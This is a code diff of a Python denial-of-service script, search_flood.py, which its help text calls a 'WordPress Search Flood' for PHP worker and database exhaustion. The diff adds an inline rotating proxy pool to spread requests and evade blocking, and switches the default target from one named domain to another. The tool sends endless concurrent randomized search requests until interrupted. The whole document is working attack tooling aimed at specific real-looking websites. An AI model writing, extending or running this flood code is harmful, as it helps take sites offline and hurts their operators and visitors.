@@ -6,15 +6,15 @@ Hits PHP workers + MySQL simultaneously
 
 Usage:
   python3 search_flood.py
+  python3 search_flood.py --target metoo-shatkin.com
   python3 search_flood.py --target metoo-buffalo.com --concurrency 50
   python3 search_flood.py --verbose
 """
 
-import requests, time, sys, argparse, random
+import requests, time, sys, argparse, random, threading, itertools
 import os
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-from proxy_pool import ProxyPool
 
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"
@@ -42,13 +42,53 @@ SEARCH_TERMS = [
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+#  PROXY POOL
+# ─────────────────────────────────────────────────────────────────────────────
+
+class ProxyPool:
+    def __init__(self, path):
+        with open(path) as f:
+            raw = [l.strip() for l in f if l.strip()]
+        self.proxies = [
+            p if p.startswith(("http","socks")) else f"http://{p}"
+            for p in raw
+        ]
+        self._cycle = itertools.cycle(self.proxies)
+        self._lock  = threading.Lock()
+        self._dead  = set()
+        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path}")
+
+    def next(self):
+        with self._lock:
+            for _ in range(len(self.proxies)):
+                p = next(self._cycle)
+                if p not in self._dead:
+                    return p
+        return None
+
+    def mark_dead(self, proxy):
+        with self._lock:
+            self._dead.add(proxy)
+
+    def alive(self):
+        return len(self.proxies) - len(self._dead)
+
+    def refresh(self):
+        print(f"\n  {Y}[PROXY]{W} Pool exhausted — resetting...\n")
+        with self._lock:
+            self._dead  = set()
+            self._cycle = itertools.cycle(self.proxies)
+        print(f"\n  {G}[PROXY]{W} Reset — {len(self.proxies)} proxies back in rotation.\n")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 #  SINGLE REQUEST
 # ─────────────────────────────────────────────────────────────────────────────
 
 def send_search(req_num, target, pool):
     proxy = pool.next()
     if not proxy:
-        return req_num, 0, 0, 0, "N/A", proxy, "no proxy available"
+        return req_num, 0, 0, 0, "N/A", "none", "no proxy available"
 
     term = random.choice(SEARCH_TERMS)
     url  = f"https://{target}/?s={term}"
@@ -102,8 +142,8 @@ def main():
         description="WordPress Search Flood — /?s= worker + DB exhaustion",
         formatter_class=argparse.RawTextHelpFormatter
     )
-    p.add_argument("--target",      default="metoo-buffalo.com",
-                   help="Target domain (default: metoo-buffalo.com)")
+    p.add_argument("--target",      default="metoo-shatkin.com",
+                   help="Target domain (default: metoo-shatkin.com)")
     p.add_argument("--concurrency", type=int, default=50,
                    help="Concurrent requests per burst (default: 50)")
     p.add_argument("--proxy-file",  default=PROXY_FILE,
@@ -129,7 +169,6 @@ def main():
   Target      : https://{target}/?s=<random_word>
   Concurrency : {args.concurrency} per burst
   Proxies     : {pool.alive()} alive — rotating per request
-  Auto-refresh: ON — triggers when alive drops below 50%
   Search terms: {len(SEARCH_TERMS)} common words (new term each request)
   Attack path : PHP workers + MySQL LIKE scan simultaneously
   Mode        : Continuous until Ctrl+C
@@ -179,8 +218,8 @@ def main():
                       f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | "
                       f"AvgSize={avg_kb:.0f}KB | {status}\n")
 
-            # auto-refresh when alive drops below 50%
-            pool.maybe_refresh()
+            if pool.alive() == 0:
+                pool.refresh()
 
             if args.delay > 0:
                 time.sleep(args.delay)
@@ -188,7 +227,6 @@ def main():
     except KeyboardInterrupt:
         print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C received.\n")
 
-    # ── final report ──────────────────────────────────────────────────────────
     runtime = time.time() - start
     total   = total_ok + total_err
 
